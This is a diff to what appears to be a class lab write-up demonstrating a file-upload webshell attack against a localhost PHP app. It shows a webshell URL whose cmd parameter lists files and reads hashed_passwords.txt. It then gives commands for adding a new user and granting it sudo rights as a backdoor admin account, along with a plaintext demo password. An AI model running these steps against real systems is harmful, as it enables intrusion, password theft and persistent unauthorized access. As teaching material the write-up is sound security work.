@@ -13,20 +13,27 @@ e.g. https://example.com/uploads/hello_world.txt
 4) Attacker opens the webshell.
 - The link will fail, since it is an executable that needs input
 - simply add this '?cmd=ls' at the end of the link containing 'malicious.php?'
-- should look like this: 'http://localhost:4000/php_app/uploads/malicious.php?cmd=(cd%20../..;ls;cat%20hashed_passwords.txt)'
+- should look like this: 'http://localhost:4000/php_app/uploads/malicious.php?cmd=(cd ../..;ls;cat hashed_passwords.txt)'
+
+4.1) For the demo, login as the user demo_user on the cmd using:
+su - demouser 
+password is 'sc3010'
 
 
 5) Then, he logins as root
+
+
 6) He adds a user
 sudo adduser newusername
 
 Note: the echo command prints the values on the command line, replicating us entering user input
 Linux asks for an input of 'username, password, confirm_password, then some random inputs where we can just spam enter key"
-echo -e "newuser\nsc3010\nsc3010\n\n\n\n\n\n" | sudo adduser newuser
+echo -e "sc3010\nsc3010\n\n\n\n\n\n" | sudo adduser newuser
 6.1) check if new user is created
 cat /etc/passwd
 
 7) grants the user admin priv
+-a (append) -G (Group), so append to group sudo (root users)
 sudo usermod -aG sudo newuser
 
 
